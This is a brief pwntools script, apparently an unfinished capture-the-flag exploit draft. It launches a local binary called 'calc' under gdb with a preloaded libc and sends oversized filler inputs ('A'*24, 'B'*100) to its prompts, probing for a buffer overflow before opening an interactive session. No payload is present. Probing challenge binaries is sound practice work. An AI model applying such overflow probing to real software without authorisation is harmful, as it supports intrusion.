from pwn import *

context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./calc")
libc = ELF("./libc.so.6")
ld_preload = {"LD_PRELOAD": "./libc.so.6"}


#p = process('./vuln')
p = gdb.debug("./calc", '''
break *main''', env=ld_preload)

# Global Data
p.recvline()
p.sendline(b"A" * 24)
p.sendline(b"q")


# Number of threads
p.sendline(b"24")
p.sendline(b"q")

# Global Data #2
p.sendline(b"q")


# Feedback
p.sendline(b"y")
p.sendline(b"B" * 100)
p.interactive()

